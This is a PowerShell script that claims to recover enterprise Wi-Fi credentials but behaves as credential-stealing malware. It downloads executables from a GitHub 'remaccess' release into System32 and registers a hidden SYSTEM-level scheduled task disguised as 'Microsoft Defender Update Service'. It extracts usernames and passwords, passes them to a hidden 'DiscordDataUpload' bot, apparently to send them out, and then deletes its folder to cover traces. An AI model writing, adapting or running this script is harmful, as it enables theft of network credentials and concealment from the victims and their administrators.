#Fully Functional script to recover Usernames and Passwords for Enterprice Networks.
$basePath = "C:\Windows\System32\WifiEntRecov\"
$localFilePath = $basePath + "EnterpriseWifiPasswordRecover.exe"
$phase1outputfile = $basePath + "WifiWifiEntLog.txt"
$finaloutput = $basePath + "WifiPhase2Log.txt"
$botpath = $basePath + "DiscordDataUpload.exe"
$urlFilePathMappings = @{
  "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe" = "C:\Windows\System32\WifiEntRecov\DiscordDataUpload.exe"
  "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/EnterpriseWifiPasswordRecover.exe" = "C:\Windows\System32\WifiEntRecov\EnterpriseWifiPasswordRecover.exe"
}
# Create array of URLs for later use
$urls = $urlFilePathMappings.Keys

# Specify the task name
$pingdaemontask = "Microsoft Defender Update Service"

# Check if the directory exists, if it does, clean it, if it doesn't, create it
if (-not (Test-Path $basePath)) {
  New-Item -Path $basePath -ItemType Directory -Force | Out-Null
}
else {
  Get-ChildItem -Path $basePath | Remove-Item -Force -Recurse
}


# Download files from URLs
foreach ($url in $urls) {
  $localFilePath = $urlFilePathMappings[$url]
  try {
      Invoke-WebRequest -Uri $url -OutFile $localFilePath -UseBasicParsing
  }
  catch {
      Write-Host "Failed to download file from $url"
  }
}



# XML for the scheduled task
$pingdaemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-24T19:20:37.0889003</Date>
    <Author>Microsoft\System</Author>
    <URI>\Microsoft Defender Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <RegistrationTrigger>
      <Enabled>true</Enabled>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\EnterpriseWifiPasswordRecover.exe</Command>
      <WorkingDirectory>C:\Windows\System32</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

# Check if the task exists, if it does, unregister it
if (Get-ScheduledTask -TaskName $pingdaemontask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
}

# Register the scheduled task
Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null

# Start the scheduled task
Start-ScheduledTask -TaskName $pingdaemontask
$currentUsername = $env:USERNAME
Start-Process -FilePath $localFilePath -ArgumentList "-u", $currentUsername -RedirectStandardOutput $phase1outputfile -Wait

if (Test-Path $phase1outputfile) {
    $outputContent = Get-Content $phase1outputfile
    $usernames = @()
    $passwords = @()
    $userRegex = "Username: (.+)"
    $passwordRegex = "Password: (.+)"

    foreach ($line in $outputContent) {
        if ($line -match $userRegex) {
            $usernames += $matches[1]
        } elseif ($line -match $passwordRegex) {
            $passwords += $matches[1]
        }
    }

    $credentialsTable = @()
    if ($usernames.Count -eq $passwords.Count) {
        for ($i = 0; $i -lt $usernames.Count; $i++) {
            $credentialsTable += [PSCustomObject]@{
                Username = $usernames[$i]
                Password = $passwords[$i]
            }
        }
    }

    $credentialsTable | Format-Table -AutoSize | Out-File -FilePath $finaloutput

    if (Test-Path $botpath) {
        Start-Process -FilePath $botpath -ArgumentList "-File `"$finaloutput`"" -WindowStyle Hidden
    } else {
        Write-Host "Bot not found at $botpath"
    }
} else {
    Write-Host "Phase 1 output file not found at $phase1outputfile"
}

#CleanUP
Start-Sleep -Seconds 20
Remove-Item -Path $basePath -Force -Recurse